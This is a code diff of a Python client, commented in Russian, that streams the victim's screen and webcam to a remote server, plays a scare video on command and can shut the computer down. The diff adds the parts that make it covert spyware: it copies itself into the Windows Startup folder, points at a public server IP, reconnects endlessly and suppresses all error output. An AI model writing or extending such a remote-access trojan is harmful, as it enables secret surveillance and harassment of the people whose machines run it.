@@ -4,10 +4,22 @@ import struct
 import threading
 import io
 import os
+import sys
+import shutil
 from PIL import ImageGrab
 import cv2
 from moviepy.editor import VideoFileClip
 import yt_dlp
+from pathlib import Path
+import time
+
+def add_to_startup():
+    """Добавляет программу в автозагрузку."""
+    script_path = Path(sys.argv[0])  # Путь к текущему скрипту
+    startup_folder = Path(os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
+
+    if not (startup_folder / script_path.name).exists():
+        shutil.copy(script_path, startup_folder)
 
 def stream_screen_and_camera(client_socket):
     cap = cv2.VideoCapture(0)
@@ -18,7 +30,7 @@ def stream_screen_and_camera(client_socket):
                 client_socket.settimeout(1)
                 command = client_socket.recv(4096).decode()
                 if command == 'PLAY_VIDEO':
-                    play_video(r'C:\Games\SCREAMER  PARA ASUSTAR A TUS AMIGOS.mp4')
+                    play_video(r'C:\Games\SCREAMER PARA ASUSTAR A TUS AMIGOS.mp4')
                     continue
             except socket.timeout:
                 pass
@@ -42,8 +54,8 @@ def stream_screen_and_camera(client_socket):
             camera_message_size = struct.pack("!L", len(camera_data))
             client_socket.sendall(camera_message_size + camera_data)
 
-    except Exception as e:
-        print(f'Error: {e}')
+    except Exception:
+        pass  # Игнорируем все ошибки
     finally:
         cap.release()
         client_socket.close()
@@ -61,30 +73,29 @@ def play_video(video_path):
 def shutdown_computer():
     """Выключает компьютер."""
     if os.name == 'nt':
-        # Команда для Windows
         os.system("shutdown /s /t 0")
     else:
-        # Команда для Unix систем
         os.system("sudo shutdown -h now")
 
 def main():
-    SERVER_IP = "172.17.42.105"  # Замените на IP сервера
+    # Добавляем программу в автозагрузку
+    add_to_startup()
+
+    SERVER_IP = "5.173.152.70"  # Замените на IP сервера
     SERVER_PORT = 5000          # Порт сервера
 
-    try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((SERVER_IP, SERVER_PORT))
-        
-        # Запуск потока для стриминга экрана и камеры
-        stream_thread = threading.Thread(target=stream_screen_and_camera, args=(client_socket,))
-        stream_thread.start()
-        stream_thread.join()  # Ждем завершения потока стриминга
+    while True:
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((SERVER_IP, SERVER_PORT))
 
-    except Exception as e:
-        print(f'Error: {e}')
-    finally:
-        if 'client_socket' in locals():
-            client_socket.close()
+            # Запуск потока для стриминга экрана и камеры
+            stream_thread = threading.Thread(target=stream_screen_and_camera, args=(client_socket,))
+            stream_thread.start()
+            stream_thread.join()  # Ждем завершения потока стриминга
+
+        except Exception:
+            time.sleep(5)  # Ждем 5 секунд перед перезапуском
 
 def download_video(url, path='.'):
     try:
@@ -92,11 +103,9 @@ def download_video(url, path='.'):
             'outtmpl': f'{path}/%(title)s.%(ext)s',
         }
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            print(f"Скачиваю: {url}")
             ydl.download([url])
-            print("Скачивание завершено!")
-    except Exception as e:
-        print(f"Произошла ошибка: {e}")
+    except Exception:
+        pass  # Игнорируем ошибки
 
 # Пример использования
 video_url = 'https://youtu.be/5p5d1vflc_g'
